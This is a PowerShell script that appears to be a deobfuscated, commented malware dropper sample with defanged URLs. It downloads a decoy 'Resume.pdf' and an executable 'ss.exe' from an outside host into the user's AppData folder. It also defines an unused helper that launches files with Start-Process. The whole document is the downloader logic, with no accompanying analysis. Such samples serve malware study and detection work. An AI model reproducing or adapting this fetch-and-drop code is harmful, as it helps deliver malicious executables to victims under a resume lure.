# Function to write byte data to a specified file path
function WriteBytesToFile($filePath, $fileBytes) {
    [IO.File]::WriteAllBytes($filePath, $fileBytes)
}

# Function to execute a file at the specified path
function ExecuteFile($filePath) {
    Start-Process $filePath
}

# Function to download data from a given URL using WebClient
function DownloadDataFromUrl($url) { 
    $webClient = New-Object Net.WebClient
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::TLS12
    $fileData = $webClient.DownloadData($url)
    return $fileData
}

# Main function to handle file operations
function Main() {
    # Define the AppData directory path
    $appDataPath = "$env:AppData\"

    # Define the path for Resume.pdf
    $resumeFilePath = "$appDataPathResume.pdf"
    
    # Check if Resume.pdf already exists
    if (Test-Path -Path $resumeFilePath) {
        Write-Output "Existing file: $resumeFilePath"
    }
    else {
        # URL for Resume.pdf
        $resumeUrl = "hXXps://awall[.]shop/#####/Resume.pdf"
        
        # Download the Resume.pdf data
        $resumeData = DownloadDataFromUrl $resumeUrl
        
        # Write the downloaded data to Resume.pdf
        WriteBytesToFile $resumeFilePath $resumeData
        
        Write-Output "File downloaded: $resumeFilePath"
    }
    
    # Define the path for ss.exe
    $exeFilePath = "$appDataPathss.exe"
    
    # Check if ss.exe already exists
    if (Test-Path -Path $exeFilePath) {
        Write-Output "Existing file: $exeFilePath"
    }
    else {
        # URL for ss.exe
        $exeUrl = "htXXps://awall[.]shop/#####/ss.exe"
        
        # Download the ss.exe data
        $exeData = DownloadDataFromUrl $exeUrl
        
        # Write the downloaded data to ss.exe
        WriteBytesToFile $exeFilePath $exeData
        
        Write-Output "File downloaded: $exeFilePath"
    }
}

# Execute the Main function
Main